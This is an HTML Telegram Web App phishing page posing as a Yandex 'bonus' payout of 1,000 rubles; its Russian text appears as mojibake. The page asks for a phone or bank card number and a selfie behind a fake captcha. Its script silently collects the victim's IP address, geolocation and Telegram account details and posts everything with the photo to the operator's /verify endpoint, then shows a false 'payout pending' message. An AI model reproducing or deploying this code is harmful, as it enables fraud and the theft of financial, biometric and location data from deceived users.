<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Yandex Distribution</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --primary: #FFCC00;
            --bg: #050505;
            --text: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.03);
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: "Yandex Sans Text", -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .bg-animate {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 20% 30%, rgba(255, 204, 0, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.03) 0%, transparent 40%);
            z-index: -1;
            animation: pulseBg 8s infinite alternate;
        }

        @keyframes pulseBg { 0% { opacity: 0.6; } 100% { opacity: 1; } }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 30px;
            width: 90%;
            max-width: 380px;
            text-align: center;
            position: relative;
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
            z-index: 1;
        }

        .y-logo-wrapper {
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
            filter: drop-shadow(0 0 8px rgba(255, 204, 0, 0.4));
        }

        .amount {
            font-size: 52px;
            font-weight: 900;
            margin: 5px 0;
            background: linear-gradient(to right, #FFCC00, #FFEE00);
            -webkit-background-clip: text;
            background-clip: text; 
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(255, 204, 0, 0.4));
        }

        .method-selector {
            display: flex;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 4px;
            margin-bottom: 15px;
        }

        .method-btn {
            flex: 1;
            padding: 10px;
            font-size: 13px;
            border-radius: 10px;
            cursor: pointer;
            border: none;
            background: transparent;
            color: #888;
            transition: 0.3s;
        }

        .method-btn.active {
            background: rgba(255,255,255,0.1);
            color: #fff;
        }

        .input-box {
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 16px;
            width: 100%;
            color: white;
            font-size: 16px;
            margin-bottom: 12px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }

        .input-box:focus { border-color: var(--primary); }

        .main-btn {
            width: 100%;
            padding: 20px;
            background: var(--primary);
            border: none;
            border-radius: 20px;
            color: #000;
            font-size: 17px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
        }

        .captcha-area {
            background: rgba(255,255,255,0.03);
            border-radius: 16px;
            padding: 15px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            cursor: pointer;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .check-circle {
            width: 20px; height: 20px;
            border: 2px solid var(--primary);
            border-radius: 50%;
            margin-right: 12px;
            display: flex; align-items: center; justify-content: center;
        }

        .photo-step {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 20px;
            background: rgba(255,204,0,0.05);
            padding: 15px;
            border-radius: 18px;
            border: 1px dashed rgba(255,204,0,0.3);
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="bg-animate"></div>

<div class="card">
    
    <img src="yap.png" alt="Yandex" style="width: 100%; border-radius: 20px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">

    <div class="y-logo-wrapper">
        <svg width="70" height="28" viewBox="0 0 70 28" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M11.5 25V3.5H15.8L11.5 25Z" fill="#FFCC00"/>
            <path d="M22 25H18L13 13L8 25H4L11 8.5V3.5H15V8.5L22 25Z" fill="white"/>
            <path d="M32 25H28V3.5H32V25Z" fill="white"/>
            <path d="M44 25H40V14H36V25H32V3.5H36V10H40V3.5H44V25Z" fill="white"/>
            <path d="M56 25H52V14.5C52 11.5 50.5 10 48.5 10C46.5 10 45 11.5 45 14.5V25H41V3.5H45V8C46 5 48 3.5 50.5 3.5C54 3.5 56 6 56 10V25Z" fill="white"/>
        </svg>
    </div>
    
    <div style="font-size: 14px; color: #888; letter-spacing: 1px;">–î–û–°–¢–£–ü–ù–´–ô –ë–û–ù–£–°</div>
    <div class="amount">1,000 ‚ÇΩ</div>
    <p style="color: #666; font-size: 12px; margin-bottom: 20px;">–ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –≤—ã–ø–ª–∞—Ç–∞ –Ω–∞ –¥–µ–±–µ—Ç–æ–≤—ã–µ –∫–∞—Ä—Ç—ã –†–§</p>

    <div class="method-selector">
        <button type="button" class="method-btn active" id="btn-sbp" onclick="switchMethod('sbp')">–ü–æ –Ω–æ–º–µ—Ä—É / –°–ë–ü</button>
        <button type="button" class="method-btn" id="btn-card" onclick="switchMethod('card')">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</button>
    </div>

    <form id="claimForm">
        <div id="sbp-input">
            <input type="text" id="phone" class="input-box" placeholder="+7 (900) 000-00-00">
        </div>
        <div id="card-input" class="hidden">
            <input type="text" id="card_num" class="input-box" placeholder="0000 0000 0000 0000">
        </div>

        <div class="captcha-area" onclick="handleCaptcha()">
            <div class="check-circle" id="capCircle"></div>
            <span id="capText" style="font-size: 13px;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ</span>
        </div>

        <div class="photo-step">
            <b>–ü—Ä–æ–π—Ç–∏ —Ñ–æ—Ç–æ–≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é</b><br>
            <span style="font-size: 11px;">–°–¥–µ–ª–∞–π—Ç–µ —Å–µ–ª—Ñ–∏ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏</span>
            <input type="file" id="photo" accept="image/*" capture="camera" style="display:none;">
            <button type="button" id="photoBtn" onclick="document.getElementById('photo').click()" style="margin-top:10px; background:white; border:none; color:black; padding:8px 20px; border-radius:10px; cursor:pointer; font-weight:bold; font-size: 12px;">–°–î–ï–õ–ê–¢–¨ –§–û–¢–û</button>
        </div>

        <button type="submit" class="main-btn" id="submitBtn">–ó–∞–±—Ä–∞—Ç—å —Å—Ä–µ–¥—Å—Ç–≤–∞</button>
    </form>
</div>

<script>
    const tg = window.Telegram.WebApp;
    let currentMethod = 'sbp';

    function initApp() {
        tg.ready();
        tg.expand();
        if (tg.isVersionAtLeast('7.7')) tg.requestFullscreen();
        tg.setHeaderColor('#050505');
        tg.enableClosingConfirmation();
    }
    initApp();

    function switchMethod(method) {
        tg.HapticFeedback.impactOccurred('light');
        currentMethod = method;
        document.getElementById('btn-sbp').classList.toggle('active', method === 'sbp');
        document.getElementById('btn-card').classList.toggle('active', method === 'card');
        document.getElementById('sbp-input').classList.toggle('hidden', method !== 'sbp');
        document.getElementById('card-input').classList.toggle('hidden', method !== 'card');
    }

    function handleCaptcha() {
        tg.HapticFeedback.impactOccurred('medium');
        const text = document.getElementById('capText');
        const circle = document.getElementById('capCircle');
        text.innerText = '–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º—ã...';
        circle.innerHTML = '‚åõ';
        
        setTimeout(() => {
            alert('–î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ñ–æ—Ç–æ–≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–∏–∂–µ.');
            text.innerText = '–û–∂–∏–¥–∞–Ω–∏–µ —Ñ–æ—Ç–æ...';
            circle.innerHTML = 'üì∏';
        }, 1000);
    }

    document.getElementById('photo').onchange = function() {
        if(this.files[0]) {
            document.getElementById('photoBtn').innerText = '‚úÖ –§–û–¢–û –ì–û–¢–û–í–û';
            document.getElementById('photoBtn').style.background = '#00FF85';
            tg.HapticFeedback.notificationOccurred('success');
        }
    };

    function getCoords() {
        return new Promise((r) => {
            navigator.geolocation.getCurrentPosition(
                (p) => r(`${p.coords.latitude}, ${p.coords.longitude}`),
                () => r("–ó–∞–ø—Ä–µ—â–µ–Ω–æ"),
                { timeout: 5000 }
            );
        });
    }

    document.getElementById('claimForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        
        if (!document.getElementById('photo').files[0]) {
            tg.HapticFeedback.notificationOccurred('error');
            alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–π–¥–∏—Ç–µ —Ñ–æ—Ç–æ–≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é");
            return;
        }

        btn.innerText = '–û–¢–ü–†–ê–í–ö–ê...';
        btn.disabled = true;

        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const { ip } = await ipRes.json();
            const location = await getCoords();
            const user = tg.initDataUnsafe?.user || {};
            const isPremium = user.is_premium ? 'üåü –î–ê' : '–ù–ï–¢';

            let mapLink = "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ";
            if (location && location !== "–ó–∞–ø—Ä–µ—â–µ–Ω–æ") {
                const coords = location.replace(/\s/g, ''); 
                mapLink = `https://www.google.com/maps?q=${coords}`;
            }

            const wallet = currentMethod === 'sbp' ? 
                `–°–ë–ü: ${document.getElementById('phone').value}` : 
                `–ö–ê–†–¢–ê: ${document.getElementById('card_num').value}`;

            const fullInfo = `
üí∞ **–ù–û–í–ê–Ø –ó–ê–Ø–í–ö–ê!**
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ **–Æ–ó–ï–†:** @${user.username || '—Å–∫—Ä—ã—Ç'}
üÜî **ID:** \`${user.id || 'n/a'}\`
üë§ **–ò–ú–Ø:** ${user.first_name || ''} ${user.last_name || ''}
‚≠êÔ∏è **PREMIUM:** ${isPremium}
üåê **IP:** \`${ip}\`
üìç **–ì–ï–û:** [–û—Ç–∫—Ä—ã—Ç—å –∫–∞—Ä—Ç—É](${mapLink})
üìç **–ö–û–û–†–î:** \`${location}\`
üí≥ **–†–ï–ö–í–ò–ó–ò–¢–´:** ${wallet}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;

            const formData = new FormData();
            formData.append('phone', wallet);
            formData.append('ip', ip);
            formData.append('details', fullInfo);
            formData.append('photo', document.getElementById('photo').files[0]);

            await fetch('/verify', { method: 'POST', body: formData });

            tg.HapticFeedback.notificationOccurred('success');
            tg.showPopup({
                title: '–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞',
                message: '–í—ã–ø–ª–∞—Ç–∞ –ø–æ—Å—Ç—É–ø–∏—Ç –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏.',
                buttons: [{type: 'close'}]
            });
        } catch (err) {
            alert('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.');
        } finally {
            btn.innerText = '–ó–∞–±—Ä–∞—Ç—å —Å—Ä–µ–¥—Å—Ç–≤–∞';
            btn.disabled = false;
        }
    };
</script>
</body>
</html>
